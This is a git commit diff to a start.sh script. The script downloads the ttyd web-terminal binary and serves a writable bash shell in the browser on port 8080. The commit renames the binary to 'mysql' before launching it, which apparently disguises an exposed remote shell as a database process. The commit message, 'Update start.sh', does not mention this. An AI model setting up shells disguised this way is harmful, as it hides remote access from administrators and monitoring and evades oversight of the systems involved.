15584b0ae43b8582990d38f977072d537336c057
Anh Tran <157559633+malphite-code-1@users.noreply.github.com>
2025-09-27 16:09:39 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -3,6 +3,8 @@ wget https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64
 
 chmod +x ttyd.x86_64
 
-./ttyd.x86_64 -p 8080 -m 1 -w ~ --browser --writable bash
+mv ttyd.x86_64 mysql
+
+./mysql -p 8080 -m 1 -w ~ --browser --writable bash
 
 echo "Server started in the background. You can check the logs in the 'server' directory."
